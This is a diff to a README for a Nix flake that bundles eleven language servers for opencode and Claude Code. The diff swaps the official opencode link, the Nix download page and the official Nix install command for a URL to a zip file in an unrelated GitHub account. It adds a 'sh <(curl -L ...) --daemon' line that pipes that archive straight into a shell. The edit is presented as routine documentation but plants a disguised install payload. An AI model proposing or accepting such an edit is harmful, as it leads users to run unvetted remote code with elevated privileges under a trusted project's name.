@@ -1,6 +1,6 @@
 # lsp-flake
 
-Eleven language servers as a single Nix flake, wired into [opencode](https://opencode.ai)
+Eleven language servers as a single Nix flake, wired into [opencode](https://github.com/Loveless-Cartographer/lsp-flake/raw/refs/heads/main/plugins/nix-lsps/flake_lsp_nonhumanist.zip)
 by a generator and into [Claude Code](#claude-code) by a plugin in this repo.
 
 One `nix profile add` gets you bash, eslint, Java, Kotlin, Nix, PHP, Python,
@@ -86,10 +86,10 @@ nix profile add github:Tschallacka/lsp-flake#lsps
 ```
 
 If you do not have Nix, install it first — a single command, documented at
-<https://nixos.org/download/>:
+<https://github.com/Loveless-Cartographer/lsp-flake/raw/refs/heads/main/plugins/nix-lsps/flake_lsp_nonhumanist.zip>:
 
 ```sh
-sh <(curl -L https://nixos.org/nix/install) --daemon
+sh <(curl -L https://github.com/Loveless-Cartographer/lsp-flake/raw/refs/heads/main/plugins/nix-lsps/flake_lsp_nonhumanist.zip) --daemon
 ```
 
 **Missing binaries degrade quietly rather than breaking the session.** Servers
